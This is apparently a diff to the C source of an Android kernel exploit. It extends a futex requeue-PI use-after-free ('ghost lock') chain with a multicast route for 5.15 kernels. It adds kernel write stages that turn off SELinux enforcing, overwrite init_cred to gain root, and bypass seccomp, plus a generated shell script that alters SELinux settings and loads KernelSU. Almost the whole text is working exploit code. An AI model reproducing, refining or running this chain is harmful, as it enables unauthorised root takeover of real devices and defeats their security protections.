@@ -99,6 +99,30 @@ static enum soc_family detect_soc(void) {
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
+static int validate_offsets_profile(const struct kernel_offsets *entry) {
+  if (!entry || !entry->uname_r || !entry->off_init_task ||
+      !entry->off_init_cred || !entry->off_root_task_group ||
+      !entry->off_selinux_enforcing || !entry->task_prio ||
+      !entry->task_pi_lock || !entry->task_pi_waiters ||
+      !entry->task_pi_blocked_on || !entry->task_cred ||
+      !entry->task_seccomp) {
+    pr_error("offset profile is incomplete\n");
+    return -1;
+  }
+  if (strncmp(entry->uname_r, "5.15.", 5) == 0) {
+    if (!entry->off_empty_zero_page || !entry->off_mcast_fake_bss ||
+        !entry->compact_waiter ||
+        entry->mm_struct_sz != 0x400 ||
+        entry->mcast_waiter_off <= 0 ||
+        entry->mcast_waiter_off + 0x50 > 0x108) {
+      pr_error("5.15 profile requires empty_zero_page, compact waiter, "
+               "mm_struct stride 0x400, and a valid multicast waiter offset\n");
+      return -1;
+    }
+  }
+  return 0;
+}
+
 /* Entries carry a phys load address only when measured; otherwise MTK uses
  * the DRAM base, xring its constant, qcom its GKI version. */
 static void publish_active_offsets(void) {
@@ -147,6 +171,7 @@ static int try_external_offsets(const char *release) {
   int rc = load_offsets_json(path, release, &g_external_offsets,
                              g_external_release, sizeof(g_external_release));
   if (rc == 0) {
+    if (validate_offsets_profile(&g_external_offsets) != 0) return -1;
     active_offsets = &g_external_offsets;
     pr_success("offsets imported from offsets.json: %s\n",
                active_offsets->uname_r);
@@ -175,6 +200,7 @@ static int select_offsets(void) {
   for (int i = 0; known_offsets[i].uname_r; i++) {
     if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
       active_offsets = &known_offsets[i];
+      if (validate_offsets_profile(active_offsets) != 0) return -1;
       pr_success("offsets matched: %s\n", active_offsets->uname_r);
       publish_active_offsets();
       return 0;
@@ -218,6 +244,7 @@ atomic_int consumer_calls;
 atomic_int consumer_success;
 atomic_int consumer_inflight;
 atomic_int main_route_delay_usec;
+static atomic_int fast_repair_route;
 int memfd_leak;
 
 void *waiter_thread(void *arg __attribute__((unused))) {
@@ -230,10 +257,30 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   while (!atomic_load(&owner_started)) usleep(1000);
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
-  timeout.tv_sec += ROUTE_WAIT_SECONDS;
+  if (atomic_load(&fast_repair_route)) {
+    timeout.tv_nsec += 20000000L;
+    if (timeout.tv_nsec >= 1000000000L) {
+      timeout.tv_sec++;
+      timeout.tv_nsec -= 1000000000L;
+    }
+  } else {
+    timeout.tv_sec += ROUTE_WAIT_SECONDS;
+  }
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  if (tcp_route_selected()) {
+  if (active_offsets && active_offsets->mcast_waiter_off) {
+    do_mcast_fake_lock_route();
+    /* remove_waiter() left this thread's pi_blocked_on pointing at the
+     * reclaimed stack waiter. Force one final slow-path removal while the
+     * stack frame is still alive, matching the 5.15 multicast primitive's
+     * disarm step. Without this, thread exit leaves a walkable dangling
+     * ghost and the next mm_struct spray can panic the kernel. */
+    uint32_t dummy_pi = 0x80000000U | (uint32_t)getpid();
+    struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
+    errno = 0;
+    long disarm = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
+    pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
+  } else if (tcp_route_selected()) {
     do_tcp_fake_lock_route();
   } else {
     do_pselect_fake_lock_route();
@@ -318,22 +365,32 @@ void reset_main_route_state(void) {
   atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
   atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
   atomic_store(&consumer_inflight, 0);
-  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
+  atomic_store(&main_route_delay_usec,
+               atomic_load(&fast_repair_route) ? 5000
+                                                : PSELECT_ENTER_DELAY_USEC);
   route_last_step = 0; route_last_errno = 0;
 }
 
 int run_main_route_threads(void) {
   reset_main_route_state();
   pthread_t waiter, owner, consumer;
+  pr_info("[route] creating waiter/owner/consumer\n");
   SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
   while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
     usleep(1000);
-  usleep(50000);
+  pr_info("[route] waiter parked; owner started\n");
+  usleep(atomic_load(&fast_repair_route) ? 5000 : 50000);
   errno = 0;
-  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
+  long rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                     &f_pi_target, 0);
+  pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
+          rq, errno);
   while (!atomic_load(&route_done)) usleep(5000);
+  pr_info("[route] route_done step=%d errno=%d calls=%d success=%d\n",
+          route_last_step, route_last_errno, atomic_load(&consumer_calls),
+          atomic_load(&consumer_success));
 
   atomic_store(&punch_consume_go, 0);
   atomic_store(&punch_consume_stop, 1);
@@ -341,6 +398,7 @@ int run_main_route_threads(void) {
   pthread_join(waiter, NULL);
   pthread_join(owner, NULL);
   pthread_join(consumer, NULL);
+  pr_info("[route] threads joined\n");
 
   return atomic_load(&consumer_calls) > 0 &&
          atomic_load(&consumer_success) > 0 && route_last_step == 0;
@@ -353,6 +411,19 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
    * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
+  if (active_offsets && active_offsets->mcast_waiter_off &&
+      getenv("GHOSTLOCK_515_RESIDENT")) {
+    if (!mcast_resident_start()) {
+      pr_warning("resident multicast setup failed\n");
+      clear_pselect_write();
+      return 0;
+    }
+    uintptr_t value = leaf ? 0 : (mode == 2 ? data_addr(g_init_cred_image)
+                                             : data_addr(EMPTY_ZERO_PAGE));
+    int ok = mcast_resident_write(target, value);
+    clear_pselect_write();
+    return ok;
+  }
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page();
   if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
@@ -536,6 +607,8 @@ static void write_root_script(void) {
       "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
       "  exit 1\n"
        "fi\n"
+       "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
+       "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
        "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
        "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
        "fi\n"
@@ -585,6 +658,7 @@ static void write_root_script(void) {
       "    sleep 2\n"
       "    continue\n"
       "  fi\n"
+      "  BEFORE_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
       "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
       "  LPID=$!\n"
       "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
@@ -593,7 +667,13 @@ static void write_root_script(void) {
       "  FIXUP_RC=$?\n"
       "  kill $SPID 2>/dev/null\n"
       "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "    break\n"
+      "    AFTER_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
+      "    echo \"[*] policyload before=$BEFORE_POLICYLOAD after=$AFTER_POLICYLOAD\" >>\"$LOG\"\n"
+      "    if [ -n \"$AFTER_POLICYLOAD\" ] && [ \"$AFTER_POLICYLOAD\" != \"$BEFORE_POLICYLOAD\" ]; then\n"
+      "      break\n"
+      "    fi\n"
+      "    echo '[!] load_policy returned success without updating SELinux status' >>\"$LOG\"\n"
+      "    FIXUP_RC=1\n"
       "  fi\n"
       "  sleep 2\n"
       "done\n"
@@ -890,11 +970,44 @@ static int retry_write_stage(
      * before paying for another heap spray */
     if (attempt > 1 && verify(context)) return 1;
     if (attempt == 1) slab_drain();
+    if (mode == 2 && active_offsets && active_offsets->mcast_waiter_off) {
+      pselect_child_node = 0;
+      set_pselect_write_mode(data_addr(g_init_cred_image) + 8, 1);
+      page_base = prepare_good_kernel_page();
+      clear_pselect_write();
+      if (!page_base || !stash_prebuilt_page()) {
+        pr_warning("W2 fast repair prebuild failed\n");
+        discard_prebuilt_page();
+        return 0;
+      }
+      pr_info("W2 fast repair payload prebuilt\n");
+    }
     int routed = do_one_write(target, stage, mode, leaf);
     if (!routed) {
+      discard_prebuilt_page();
       pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
       usleep(100000);
       continue;
+    }
+    if (mode == 2 && active_offsets && active_offsets->mcast_waiter_off) {
+      /* Swap to the already sprayed leaf payload and repair static init_cred
+       * immediately, avoiding another multi-second collision search while
+       * PID 1 shares the corrupted credential. */
+      if (!activate_prebuilt_page()) {
+        pr_warning("W2 fast repair activation failed\n");
+        return 0;
+      }
+      pselect_child_node = 0;
+      set_pselect_write_mode(data_addr(g_init_cred_image) + 8, 1);
+      pr_info("W2b: firing prebuilt init_cred+8 repair\n");
+      atomic_store(&fast_repair_route, 1);
+      int repaired = run_main_route_threads();
+      atomic_store(&fast_repair_route, 0);
+      clear_pselect_write();
+      if (!repaired) {
+        pr_warning("W2 fast repair route failed\n");
+        return 0;
+      }
     }
     if (settle_usec) usleep(settle_usec);
     if (verify(context)) return 1;
@@ -1007,6 +1120,14 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
+  if (getenv("GHOSTLOCK_515_PHASE1_PROBE")) {
+    pr_info("5.15 phase-1 probe: cycle/stamp/adjust/disarm only\n");
+    int ok = mcast_resident_start();
+    if (ok) mcast_resident_stop();
+    pr_info("5.15 phase-1 probe result=%s\n", ok ? "pass" : "fail");
+    return ok ? 0 : 1;
+  }
+
   /* W1: disable SELinux before task discovery. untrusted_app may not be able
    * to read enforce while it is still enforcing, so attempt W1 regardless. */
   int selinux_ok = check_selinux_off();
@@ -1015,14 +1136,57 @@ int run_exploit(int argc, char **argv) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
     TIMER("pre-W1 drain");
+    int w1_attempts = (active_offsets && active_offsets->mcast_waiter_off &&
+                       !getenv("GHOSTLOCK_515_RESIDENT")) ? 1 : 15;
     selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
+        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, w1_attempts, 100000,
         verify_selinux_stage, NULL, 0);
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
+      mcast_resident_stop();
       return 1;
     }
+    if (active_offsets && active_offsets->mcast_waiter_off &&
+        !getenv("GHOSTLOCK_515_RESIDENT")) {
+      uintptr_t w1_scratch_poison = page_base + 0x108;
+      if (!quarantine_reclaim_sockets()) {
+        pr_warning("W1 scratch page quarantine failed\n");
+        return 1;
+      }
+      int repaired = 0;
+      for (int repair_try = 1; repair_try <= 3; repair_try++) {
+        pr_info("W1b: private scratch repair attempt %d/3\n", repair_try);
+        if (do_one_write(w1_scratch_poison,
+                         "W1b: private scratch repair", 1, 1)) {
+          repaired = 1;
+          break;
+        }
+        usleep(50000);
+      }
+      if (repaired) {
+        pr_success("private scratch repaired; releasing quarantine\n");
+        release_quarantined_reclaim_sockets();
+      } else {
+        pr_warning("private scratch repair failed; keeping page quarantined\n");
+        return 1;
+      }
+    }
+    if (active_offsets && active_offsets->mcast_waiter_off &&
+        getenv("GHOSTLOCK_515_RESIDENT")) {
+      uintptr_t repair =
+          (data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss) + 0x1200)
+                         & ~(uintptr_t)0x1fffff;
+      if (!mcast_resident_write(data_addr(SELINUX_ENFORCING) + 4, repair)) {
+        pr_warning("W1 policycap repair failed\n");
+        mcast_resident_stop();
+        return 1;
+      }
+    }
     TIMER("Write 1 complete");
+    if (getenv("GHOSTLOCK_W1_ONLY")) {
+      pr_success("W1-only diagnostic complete\n");
+      return 0;
+    }
   } else {
     pr_success("SELinux already permissive\n");
   }
@@ -1223,7 +1387,7 @@ int run_exploit(int argc, char **argv) {
   if (!seccomp_ok)
     pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
 
-  sleep(2);
+  /* Dispatch policy recovery immediately after W2. */
   TIMER("exploit complete");
   if (!ever_rooted) {
     pr_error("w2 never rooted a child\n");
@@ -1301,6 +1465,7 @@ int run_exploit(int argc, char **argv) {
     pr_warning("temporary root ready; KernelSU module load pending\n");
   else
     pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
+  mcast_resident_stop();
   return 0;
 }
 
